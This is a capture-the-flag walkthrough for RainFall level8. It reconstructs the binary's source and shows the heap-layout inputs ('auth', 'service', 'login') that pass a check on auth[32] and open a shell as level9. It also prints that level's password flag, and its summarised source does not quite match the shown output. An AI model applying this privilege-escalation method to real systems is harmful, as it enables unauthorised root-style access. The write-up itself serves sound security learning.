# RainFall: Level8 Walkthrough

## Step 1: Overview

Connect to the RainFall server:

```bash
ssh level8@${RAINFALL_IP} -p 4242
```

List the binary:

```bash
level8@RainFall:~$ ls -l
-rwsr-s---+ 1 level9 users 7552 Aug 30  2022 level8
```

This binary is SUID-owned by `level9`. The vulnerability lies in a logic bug that causes out-of-bounds access to heap memory allocated by `malloc`.

---

## Step 2: Source Code Summary

```cpp
#include <iostream>
#include <cstring>
#include <cstdlib>

char buf[128];
char* auth = nullptr;
char* service = nullptr;

int main() 
{
    if (!fgets(buf, sizeof(buf), stdin))
        return 1;

    if (strncmp(buf, "auth ", 5) == 0)
    {
        auth = (char*)malloc(4);
        *auth = 0;

        char* input = buf + 5;
        if (strlen(input) <= 30)
        {
            strcpy(auth, input);
        }
    }

    if (strncmp(buf, "reset", 5) == 0)
    {
        free(auth);
        auth = nullptr;
    }

    if (strncmp(buf, "service", 7) == 0)
    {
        char temp[121];
        strncpy(temp, buf + 8, sizeof(temp) - 1);
        temp[sizeof(temp) - 1] = '\0';

        service = strdup(temp);
    }

    if (strncmp(buf, "login", 5) == 0)
    {
        if (auth != nullptr && auth[32] != 0)
        {
            system("/bin/sh");
        }
        else 
        {
            std::cout << "Password:\n";
        }
    }

    return (0);
}
```

* `auth` is allocated with only 4 bytes.
* The program checks `auth[32]` during the `login` command.
* The `service` command allocates memory with `strdup`, which often ends up adjacent to the memory allocated for `auth`.
* Carefully crafted input to `service` can cause a non-zero value to be written at `auth + 32`, bypassing the check.

---

## Step 3: Exploiting the Logic Bug

1. Start the binary:

```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
```

2. Allocate `auth` with 4 bytes:

```bash
auth 77
0x804a008, (nil)
```

3. Allocate `service` with 16 characters:

```bash
service 4578451245784512
0x804a008, 0x804a018
```

4. Login (this will check `auth[32]`):

```bash
login
$ whoami
level9
```

---

## Step 4: Retrieving the Flag

```bash
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

---

## Step 5: Move to Level09

```bash
level8@RainFall:~$ su level9
Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

